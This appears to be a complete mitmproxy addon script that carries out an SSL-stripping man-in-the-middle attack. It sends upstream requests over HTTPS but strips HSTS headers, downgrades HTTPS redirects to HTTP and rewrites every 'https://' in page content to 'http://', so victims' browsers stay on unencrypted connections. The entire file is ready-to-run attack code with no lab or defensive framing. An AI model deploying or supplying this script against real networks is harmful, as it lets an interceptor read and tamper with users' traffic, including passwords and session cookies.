from mitmproxy import http
import re

def request(flow: http.HTTPFlow) -> None:
    # Check if the request is HTTP
    if flow.request.scheme == "http":
        # Upgrade to HTTPS for server communication
        flow.request.scheme = "https"
        flow.request.port = 443  # The HTTPS port

def response(flow: http.HTTPFlow) -> None:
    # Remove HSTS header from the response
    if "Strict-Transport-Security" in flow.response.headers:
        del flow.response.headers["Strict-Transport-Security"]
    
    # Ensure that the response is in HTTP format to send back to the client
    if flow.response.status_code == 301 or flow.response.status_code == 302:
        location = flow.response.headers.get("Location")
        if location and location.startswith("https://"):
            # Change "https" to "http" in the redirect location
            flow.response.headers["Location"] = location.replace("https://", "http://", 1)
    
    # Modify URLs within the page content (HTML)
    if flow.response.content:
        content = flow.response.content.decode("utf-8", errors="ignore")
        
        # Regex to find and replace all instances of https:// with http://
        content = re.sub(r'https://', 'http://', content)
        
        flow.response.content = content.encode("utf-8")

